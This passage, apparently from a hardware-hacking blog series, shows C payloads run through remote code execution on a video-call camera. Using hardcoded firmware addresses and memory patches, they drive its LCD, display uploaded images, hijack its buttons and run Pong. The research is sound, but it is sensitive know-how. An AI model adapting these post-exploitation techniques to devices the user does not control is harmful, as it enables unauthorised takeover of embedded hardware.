        for(uint32_t i = 0; i < buffer_size; i++) {
            switch(color_state) {
                case 0:  // Red
                    trans_buffer[i] = 0xF800;
                    break;
                case 1:  // Green
                    trans_buffer[i] = 0x07E0;
                    break;
                case 2:  // Blue
                    trans_buffer[i] = 0x001F;
                    break;
            }
        }
        
        LibXmDvr_SpiLcd_sendData(0xf0, 0x140, trans_buffer, buffer_size);
        sleep(1);
        
        // Cycle to next color
        color_state = (color_state + 1) % 3;
    }

    return 0;
}
```

And here is the result:

![rgb.gif](/assets/images/video_call_camera_p5/rgb.gif)

### Image Display

Now that we know the format of the *dispTransBuffer* (and we can actually write to it), we should now be able to draw images to the screen. We know that the format of the image is RGB 5:6:5, so we can use the following *ffmpeg* command to convert to the required format:

```
ffmpeg -i image.jpg -vf scale=240:320 -c:v rawvideo -pix_fmt rgb565 -f rawvideo image.raw
```

To display the image, we need to get it onto the filesystem. Our file write primitive only lets us write up to *0xc000* (which is less than *320* x *240*, meaning we cannot send a full-resolution image in one-shot). I got around this by using the same method I used for uploading the *gdbserver* - chunking it up, and using an **iperf** script to recombine everything.

All I had to do now was steal the code from the dispatcher payload that opens and reads files, copy the contents of the file into the *dispTransBuffer*, send the SPI command, and we can now write images onto the display.

```
-c
#include <stdint.h>

#define LibXmDvr_SpiLcd_setLuminance_ADDR 0x13008
#define LibXmDvr_SpiLcd_sendData_ADDR 0x1173c
#define SLEEP_ADDR 0x11c10
#define MALLOC_ADDR 0x1254c

typedef int LibXmDvr_SpiLcd_setLuminance_t(uint32_t luminance);
typedef uint32_t LibXmDvr_SpiLcd_sendData_t(uint32_t val1, uint32_t val2, uint16_t* buffer, uint32_t buffer_size);
typedef uint32_t sleep_t(uint32_t seconds);
typedef void* (*malloc_t)(uint32_t size);

#define CREATE_FILE_STRUCT_ADDR 0x22c70
#define OPEN_FILE_ADDR 0x22e68
#define READ_FILE_ADDR 0x22378
#define CLOSE_FILE_ADDR 0x225ac
#define GET_FILE_SIZE_ADDR 0x22428

struct file_struct {
    void* json_function_table;
    void* structure;
};

typedef struct file_struct* (*create_file_struct_t)(struct file_struct*);
typedef int (*open_file_struct_t)(struct file_struct*, char*, uint32_t);
typedef int (*read_file_t)(struct file_struct*, void* buffer, uint32_t count);
typedef int (*get_file_size_t)(struct file_struct*);
typedef int (*close_file_t)(struct file_struct*);

int _start(void) {
    LibXmDvr_SpiLcd_setLuminance_t *LibXmDvr_SpiLcd_setLuminance = (LibXmDvr_SpiLcd_setLuminance_t *) LibXmDvr_SpiLcd_setLuminance_ADDR;
    sleep_t *sleep = (sleep_t*) SLEEP_ADDR;
    LibXmDvr_SpiLcd_sendData_t *LibXmDvr_SpiLcd_sendData = (LibXmDvr_SpiLcd_sendData_t *) LibXmDvr_SpiLcd_sendData_ADDR;
    malloc_t malloc = (malloc_t) MALLOC_ADDR;

    create_file_struct_t create_file_struct = (create_file_struct_t) CREATE_FILE_STRUCT_ADDR;
    open_file_struct_t open_file_struct = (open_file_struct_t) OPEN_FILE_ADDR;
    read_file_t read_file = (read_file_t) READ_FILE_ADDR;
    get_file_size_t get_file_size = (get_file_size_t) GET_FILE_SIZE_ADDR;
    close_file_t close_file = (close_file_t) CLOSE_FILE_ADDR;

    struct file_struct file_desc;
    create_file_struct(&file_desc);

    int fd = open_file_struct(&file_desc, "/var/tmp/mmcblock0/iperf/image", 0x0);

    uint32_t weird_struct_address = 0x669bf8;
    uint32_t weird_struct_ptr = *(uint32_t*) weird_struct_address;
    uint32_t* weird_struct = (uint32_t*) weird_struct_ptr;
    weird_struct[0xf] = 0x0;

    uint32_t trans_buffer_pointer_address = 0x669bd8;
    uint32_t trans_buffer_address = *(uint32_t*) trans_buffer_pointer_address;
    uint16_t* trans_buffer = (uint16_t*) trans_buffer_address;

    uint32_t height = 320;
    uint32_t width = 240;
    uint32_t buffer_size = height * width * 2;

    read_file(&file_desc, trans_buffer, buffer_size);
    close_file(&file_desc);
    
    while(1) {
        LibXmDvr_SpiLcd_setLuminance(0x46);
        LibXmDvr_SpiLcd_sendData(0xf0, 0x140, trans_buffer, buffer_size);
        sleep(1);
    }

    return 0;
}
```

And here is the result:

![image_control.jpg](/assets/images/video_call_camera_p5/image_control.jpg)

## Reversing the Buttons

Ideally, we want to make our payload interactive, to do this we will need to work out how button presses are being detected by the camera.

After realising that the *hang up* button was turning the display on/off, I set a breakpoint on the **LibXmDvr_SpiLcd_setLuminance** function and traced back to the following function:

![button_press_detector.png](/assets/images/video_call_camera_p5/button_press_detector.png)

At a high level, this function is detecting if buttons have been pressed using the return value of **Libdvr_ReadADC**, we can simply clone this logic in our code to detect button presses.

### Preventing Screen Off 

As I mentioned before, I was able to find this handler because the *hang up* button causes the screen to turn on/off. This was useful, however now it keeps turning the screen on/off which is inconvenient for our payload. 

However, there is a really easy way around this:

![luminance_flag.png](/assets/images/video_call_camera_p5/luminance_flag.png)

As you can see, if we set the value stored at *0x65b420* to something that is not zero, the function no longer calls the **LibXmDvr_SpiLcd_setLuminance** function!

```
-c
uint32_t weird_flag_address = 0x65b420;
uint32_t* weird_flag_ptr = (uint32_t*) weird_flag_address;
*weird_flag_ptr = 0x1;
```

### ButtonTest

With the buttons reversed, and the normal behaviour of the buttons disabled, we can finally write some code to demonstrate where we are at:

```
-c
#include <stdint.h>

#define LibXmDvr_SpiLcd_setLuminance_ADDR 0x13008
#define LibXmDvr_SpiLcd_sendData_ADDR 0x1173c
#define SLEEP_ADDR 0x11c10
#define MALLOC_ADDR 0x1254c
#define Libdvr_ReadADC_ADDR 0x118b0

typedef int LibXmDvr_SpiLcd_setLuminance_t(uint32_t luminance);
typedef uint32_t LibXmDvr_SpiLcd_sendData_t(uint32_t val1, uint32_t val2, uint16_t* buffer, uint32_t buffer_size);
typedef uint32_t sleep_t(uint32_t seconds);
typedef void* (*malloc_t)(uint32_t size);

typedef int (*Libdvr_ReadADC_t)(uint32_t thing);

struct ButtonState {
    uint8_t left;
    uint8_t right;
};

int _start(void) {
    LibXmDvr_SpiLcd_setLuminance_t *LibXmDvr_SpiLcd_setLuminance = (LibXmDvr_SpiLcd_setLuminance_t *) LibXmDvr_SpiLcd_setLuminance_ADDR;
    sleep_t *sleep = (sleep_t*) SLEEP_ADDR;
    LibXmDvr_SpiLcd_sendData_t *LibXmDvr_SpiLcd_sendData = (LibXmDvr_SpiLcd_sendData_t *) LibXmDvr_SpiLcd_sendData_ADDR;
    malloc_t malloc = (malloc_t) MALLOC_ADDR;
    Libdvr_ReadADC_t Libdvr_ReadADC = (Libdvr_ReadADC_t) Libdvr_ReadADC_ADDR;

    // overwrite draw to screen callback in struct at 

    uint32_t weird_struct_address = 0x669bf8;
    uint32_t weird_struct_ptr = *(uint32_t*) weird_struct_address;
    uint32_t* weird_struct = (uint32_t*) weird_struct_ptr;
    weird_struct[0xf] = 0x0;

    uint32_t trans_buffer_pointer_address = 0x669bd8;
    uint32_t trans_buffer_address = *(uint32_t*) trans_buffer_pointer_address;
    uint16_t* trans_buffer = (uint16_t*) trans_buffer_address;

    // clear weird flag to stop buttons messing with the screen
    uint32_t weird_flag_address = 0x65b420;
    uint32_t* weird_flag_ptr = (uint32_t*) weird_flag_address;
    *weird_flag_ptr = 0x1;

    uint32_t height = 320;
    uint32_t width = 240;
    uint32_t buffer_size = height * width * 2;

    uint8_t color_state = 0;  // 0=red, 1=green, 2=blue

    struct ButtonState states;
    states.left = 0;
    states.right = 0;

    int adc_val;
    uint8_t left_pressed = 0;
    uint8_t right_pressed = 0;
    
    while(1) {
        LibXmDvr_SpiLcd_setLuminance(0x46);
        adc_val = Libdvr_ReadADC(1);

        // Left button logic
        if ((adc_val >= 0x29) && (adc_val <= 0x4d)) {
            states.left = 1;
        } else if (states.left == 1) {
            states.left = 0;
        }

        // Right button logic
        if ((adc_val >= 0xb0) && (adc_val <= 0xd1)) {
            states.right = 1;
        } else if (states.right == 1) {
            states.right = 0;
        }
        
        // Fill buffer with current color
        for(uint32_t i = 0; i < buffer_size; i++) {
            if (states.left) {
                trans_buffer[i] = 0x07E0;  // Green
            } else if (states.right) {
                trans_buffer[i] = 0x001F;  // Blue
            } else {
                trans_buffer[i] = 0x0000;  // Black
            }
        }
        
        LibXmDvr_SpiLcd_sendData(0xf0, 0x140, trans_buffer, buffer_size);
    }

    return 0;
}
```

And here is the result:

![buttons.gif](/assets/images/video_call_camera_p5/buttons.gif)

### Pong

Now we have sufficient control of the screen and buttons such that we can implement a game that uses only two buttons. As a quick PoC, here is a demonstration of a dumbed-down version of Pong running on it:

![pong.gif](/assets/images/video_call_camera_p5/pong.gif)

It is like a little arcade machine!

# Conclusion

In this blog, we chained some of the bugs we discovered in previous blogs together to create exploits that give us fully remote code execution. We spent some time reversing the camera's screen and button interface, eventually getting enough control to implement a simple interactive game that uses two buttons - Pong!

![pong_meme.png](/assets/images/video_call_camera_p5/pong_meme.png)